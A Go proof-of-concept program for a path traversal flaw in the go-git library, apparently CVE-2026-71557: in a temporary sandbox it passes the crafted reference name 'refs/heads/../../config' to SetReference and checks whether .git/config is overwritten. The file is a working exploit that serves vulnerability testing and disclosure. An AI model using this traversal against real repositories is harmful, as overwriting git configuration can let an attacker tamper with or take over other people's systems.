package main

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime/debug"

	"github.com/go-git/go-billy/v5/osfs"
	"github.com/go-git/go-git/v5/plumbing"
	"github.com/go-git/go-git/v5/plumbing/cache"
	"github.com/go-git/go-git/v5/storage/filesystem"
)

const (
	craftedReference = plumbing.ReferenceName("refs/heads/../../config")
	payloadHash      = "0123456789abcdef0123456789abcdef01234567"
	configMarker     = "[core]\n\trepositoryformatversion = 0\n\tpoc-marker = untouched\n"
)

func main() {
	sandbox, err := os.MkdirTemp("", "cve-2026-71557-")
	if err != nil {
		fail("create temporary directory", err)
	}
	defer os.RemoveAll(sandbox)

	dotGitPath := filepath.Join(sandbox, ".git")
	if err := os.MkdirAll(dotGitPath, 0o700); err != nil {
		fail("create .git directory", err)
	}

	storage := filesystem.NewStorage(osfs.New(dotGitPath), cache.NewObjectLRUDefault())
	if err := storage.Init(); err != nil {
		fail("initialize filesystem storage", err)
	}

	configPath := filepath.Join(dotGitPath, "config")
	if err := os.WriteFile(configPath, []byte(configMarker), 0o600); err != nil {
		fail("write config marker", err)
	}

	ref := plumbing.NewHashReference(craftedReference, plumbing.NewHash(payloadHash))
	setErr := storage.SetReference(ref)
	after, err := os.ReadFile(configPath)
	if err != nil {
		fail("read config after SetReference", err)
	}

	fmt.Println("CVE-2026-71557 go-git loose-reference path traversal PoC")
	fmt.Printf("[*] go-git version: %s\n", goGitVersion())
	fmt.Printf("[*] crafted reference: %s\n", craftedReference)
	fmt.Printf("[*] SetReference error: %v\n", setErr)

	if setErr == nil && string(after) == payloadHash+"\n" {
		fmt.Println("[+] VULNERABLE: .git/config was overwritten through the reference name.")
		return
	}

	fmt.Printf("[-] Expected overwrite was not observed; config content: %q\n", string(after))
	os.Exit(1)
}

func goGitVersion() string {
	info, ok := debug.ReadBuildInfo()
	if !ok {
		return "unknown"
	}
	for _, dependency := range info.Deps {
		if dependency.Path == "github.com/go-git/go-git/v5" {
			return dependency.Version
		}
	}
	return "unknown"
}

func fail(action string, err error) {
	fmt.Fprintf(os.Stderr, "[-] Failed to %s: %v\n", action, err)
	os.Exit(1)
}
